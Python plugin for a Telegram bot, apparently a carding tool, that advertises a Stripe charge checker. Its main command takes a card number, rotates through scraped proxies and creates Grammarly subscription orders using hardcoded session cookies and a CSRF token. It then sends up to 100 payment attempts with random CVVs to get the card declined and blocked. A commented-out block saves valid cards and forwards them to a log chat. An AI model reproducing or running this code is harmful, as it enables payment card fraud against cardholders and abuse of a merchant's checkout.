"""
≛ <b>Commands Available</b> ≛

──────────────────────
- <code>/chk</code> cc cvv mes ano || <reply_to_msg>.
➛ Stripe Charge $5.
──────────────────────

© <a href="https://t.me/TakashiKovace">TakeshiKovace</a>
"""


import json
import os
import re
import time
from time import gmtime, strftime
import requests
from telethon import Button
from mills import LOG_CHAT

from mills.decorators import bot_cmd
from mills.plugins.checkers.utils.gateinfo import get_gate_info
from mills.plugins import rand_user_base
from mills.plugins.checkers.utils.getcards  import get_cards
from mills.plugins._helpers.strings import get_strings
from mills.plugins.checkers.funcs.dead_defs import dead_one, dead_two, dead_three, get_response_chk, generate_random_string, random_cvv_date_exp, get_response_progress


@bot_cmd(cmd="dead", text_only = True)
@get_gate_info("dead")
@get_cards()
@get_strings("card_dead")
async def _(m, gate_db, user_db, cards, lang):
    
    dead_dict = {
        '_id': m.message.id,
        'status': True,
        'status_logo': '✅',
        'made_by_id': m.sender_id,
        'made_by_name': m.full_name(),
        'date': strftime("%Y-%m-%d", gmtime())
    }
    
    await m.mdb.insert_one('deadJob',  dead_dict)
    
    start_time = int(time.time())
    cc,mes,ano,cvv, bin_info = cards
    rand_user = rand_user_base.rand_user()
    countTrys = 1
    progressBar = get_response_progress(0)
    message = await m.reply(lang['trys_msg'].format(
        gate_name=gate_db['gate_name'],
        name=m.full_name(),
        id=m.sender_id,
        progress=progressBar,
        trys=countTrys,
        taken=int(time.time()) - start_time,
    ))
    
    browser = requests.Session()
    
    
    
    while countTrys < 100:
        response = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=50&country=all&ssl=all&anonymity=all')
        lines = response.text.split("\n")
        uuid = ''
        for line in lines:
            try:
                proxies = {
                    "http": f"http://{line.strip()}",
                    "https": f"http://{line.strip()}"
                }
                url = "https://subscription.grammarly.com/api/v1/order/individual"
                payload='planId=10202009&billingCountryCode=IN&billingZip=23400&billingRegionCode=DL'
                headers = {
                'Host': 'subscription.grammarly.com',
                'Content-Length': '75',
                'Sec-Ch-Ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
                'X-Csrf-Token': 'AABL/H5WbuKDMoie5LsULnpoUGA/TN4lkdH2Og',
                'X-Client-Version': '1.2.19535',
                'Sec-Ch-Ua-Mobile': '?0',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json',
                'X-Client-Type': 'funnel',
                'X-Container-Id': 'emkm7ssjru230d00',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Origin': 'https://www.grammarly.com',
                'Sec-Fetch-Site': 'same-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://www.grammarly.com/upgrade?utm_campaign=funnelOnboarding&utm_medium=internal&utm_source=funnel&selectPlan=Annual',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'Cookie': 'gnar_containerId=emkm7ssjru230d00; funnelType=free; _gid=GA1.2.103083219.1680712988; ga_clientId=1755340629.1680712988; _gcl_au=1.1.1005591024.1680712988; _rdt_uuid=1680712992175.9a2e8724-e7db-420d-9b57-61df5523c3ca; grauth=AABL_Abgo7vVq7NSmHoekyjUXs8FYotAGmW61dRT1lSxJo3c0_W0vm6fzp2lwyzAZ5OokOok14c_8YIF; csrf-token=AABL/H5WbuKDMoie5LsULnpoUGA/TN4lkdH2Og; tdi=itpad262pd09wp81t; isGrammarlyUser=true; _fbp=fb.1.1680713125650.838885962; _ga=GA1.2.1755340629.1680712988; _uetsid=f3c6b430d3d011ed98e31bb86c799c19; _uetvid=f3c89270d3d011edbeb4b95fcdafad7b; _ga_CBK9K2ZWWE=GS1.1.1680717017.2.1.1680717176.56.0.0'
                }

                response = requests.request("POST", url, headers=headers, data=payload, proxies=proxies)
                if response.ok:
                    uuid = response.json().get('orderUUID')
                    # browser.proxies = proxies
                    break
                else:
                    print(f"The proxy is not working! {line}")
            except:
                print(f"The proxy is not working! {line}")    
            
        
        if not uuid:
            await message.edit("Error while deading your card. trying again....")
            return
  
        cvvRand = random_cvv_date_exp(3)
        
        paymentID = dead_two(browser, cc, mes, ano, cvvRand)
        
        if not paymentID['id']:
            await message.edit("Error while deading your card. trying again....")
            return
        
        payment_pm = paymentID['id']
        sessionId = generate_random_string(32)
        finalRes = dead_three(
            browser, uuid, sessionId, payment_pm)
        
        if 'code' in finalRes:
            if countTrys in [10,20,30,40,50,60,70,80,90,100]:
                progressBar = get_response_progress(countTrys)
            
            dead_job = await m.mdb.find_one('deadJob',  m.message.id)
            
            if dead_job['status'] == True:
                await message.edit(lang['trys_msg'].format(
                        gate_name=gate_db['gate_name'],
                        name=m.full_name(),
                        id=m.sender_id,
                        progress=progressBar,
                        trys=countTrys,
                        taken=int(time.time()) - start_time,
                    ), buttons= [
                         Button.inline("close", data=f"deadClose_{m.message.id}")
                    ])
            else:
                await message.edit(lang['trys_msg'].format(
                        gate_name=gate_db['gate_name'],
                        name=m.full_name(),
                        id=m.sender_id,
                        progress='Deading Completed ✅',
                        trys=countTrys,
                        taken=int(time.time()) - start_time,
                    ))
                break
                
        else:
            await message.edit("Error while deading your card. trying again....")
            
        countTrys += 1
        
    r_text, r_logo, r_respo = "Deading", "✅", 'Completed'    
    
    await message.edit(lang['fin_msg'].format(
        gate_name = gate_db['gate_name'],
        card = f"{cc}|{mes}|{ano}|{cvv}",
        status = r_respo,
        logo = r_logo,
        message = r_text,
        vendor = bin_info['vendor'],
        type = bin_info['type'],
        bank_name = bin_info['bank_name'],
        country = bin_info['iso'],
        flag = bin_info['flag'],
        name = m.full_name(),
        id = m.sender_id,
        role = user_db['role'],
        taken = int(time.time()) - start_time,
    ), link_preview = False, parse_mode = 'html')
    
    # if r_respo == "CVV MATCH":
    #     if user_db['saveccs']:
    #         await m.mdb.update_one('users',{'_id': m.sender_id}, {'$addToSet': {'lives': f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}"}})
    #     m.save_lives(f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}")
    #     await m.client.send_message(LOG_CHAT, f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}")
    await m.adb.set_key(f'antispam_{str(m.sender_id)}', time.time())
    return